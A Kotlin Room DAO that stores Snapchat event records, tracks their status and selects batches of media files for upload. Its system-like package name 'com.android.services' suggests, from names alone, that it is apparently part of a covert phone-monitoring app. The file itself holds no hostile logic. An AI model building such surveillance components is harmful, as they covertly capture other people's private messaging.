package com.android.services.db.dao

import androidx.room.Dao
import androidx.room.Insert
import androidx.room.OnConflictStrategy
import androidx.room.Query
import com.android.services.db.entities.SnapChatEvent
import com.android.services.util.AppConstants

@Dao
interface SnapChatEventDao {

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(snapchatEvent: SnapChatEvent)

    @Query("Update snap_chat_event set status = :status where file = :file")
    fun update(file: String, status: Int): Int

    @Query("Select * from snap_chat_event where status = :status order by date DESC limit ${AppConstants.mediaFilesUploadLimit}")
    fun selectAllSnapChatEventEvents(status: Int): List<SnapChatEvent>
}